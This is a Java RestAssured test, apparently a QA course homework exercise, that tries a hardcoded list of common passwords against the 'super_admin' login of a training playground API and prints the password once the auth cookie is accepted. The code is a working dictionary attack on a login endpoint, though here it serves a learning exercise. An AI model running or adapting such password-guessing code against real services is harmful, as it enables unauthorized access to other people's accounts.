package HomeWork;

import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import io.restassured.response.ResponseBody;
import io.restassured.response.ResponseBodyData;
import org.apache.log4j.BasicConfigurator;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class HomeWorkEx9 {
    @Test
    public void testRestAssured() {
        String morePass = "!@#$%^&* 000000 1 111111 11111110 121212 123123 12312311 1234 12345 123458 123456 1234562 1234567 12345676 12345678 123456787 123456789 1234567893 1234567890 123qwe 1q2w3e4r14 1qaz2wsx 55555518 654321 65432117 666666 696969 777777720 88888822 Football aa123456 abc123 abc12312 access admin admin15 adobe123[a] ashley azerty bailey baseball batman charlie donald dragon dragon24 flower football freedom hello hottie iloveyou iloveyou9 jesus letmein login lovely19 loveme master michael monkey mustang ninja passw0rd password password5 password1 password125 photoshop[a] princess princess23 qazwsx qwerty qwerty4 qwerty123 qwerty12313 qwertyuiop qwertyuiop16 shadow solo starwars sunshine superman trustno1 welcome welcome21 whatever zaq1zaq1";
        String[] passwords = morePass.split(" ");
        for (int i = 0; i < passwords.length; i++) {
            String pwd = passwords[i];
            Map<String, String> data = new HashMap<>();
            data.put("login","super_admin");
            data.put("password",pwd);

            Response responseGetSecretPwd = RestAssured
                    .given()
                    .body(data)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String auth_cookie = responseGetSecretPwd.getCookie("auth_cookie");

            Response responseCheckCookie = RestAssured
                    .given()
                    .cookies("auth_cookie", auth_cookie)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            ResponseBodyData responseBodyData = responseCheckCookie.getBody();
            if ("You are authorized".equals(responseBodyData.asString())){
                System.out.println(String.format("\n\n" + responseBodyData.asString() + " --> with password : %s ", pwd));
                System.out.println(String.format("ВЕРНЫЙ ПАРОЛЬ : %s", pwd));
                break;
            }
            System.out.println(String.format("Trying to login with --> with password : %s ", pwd));
        }

    }
}
